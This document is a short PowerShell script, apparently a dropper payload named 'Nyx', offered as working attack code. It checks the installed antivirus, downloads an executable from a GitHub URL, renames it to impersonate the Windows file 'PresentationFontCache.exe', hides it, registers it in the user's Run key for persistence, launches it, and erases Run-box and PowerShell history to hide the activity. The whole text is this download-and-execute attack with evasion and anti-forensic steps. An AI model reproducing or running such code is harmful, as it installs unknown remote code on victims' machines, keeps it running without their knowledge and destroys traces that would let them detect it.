# Nyx - QTWLLZFU

$Antivirus = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntivirusProduct

if ($Antivirus -and $Antivirus.displayName -ne "Windows Defender") {

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

} else {

# Download Nyx
Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/QTWLLZFU/QTWLLZFU.exe -OutFile "$env:TEMP\QTWLLZFU.exe"

# Change Nyx Name
Rename-Item -Path "$env:TEMP\QTWLLZFU.exe" -NewName "PresentationFontCache.exe"

# Hide Nyx
$FILE=Get-Item "$env:TEMP\PresentationFontCache.exe" -Force
$FILE.attributes='Hidden'

# Add Nyx to startup processes
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "QTWLLZFU" `
-Value "$env:TEMP\PresentationFontCache.exe"

# Run Nyx
& "$env:TEMP\PresentationFontCache.exe"

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
} 
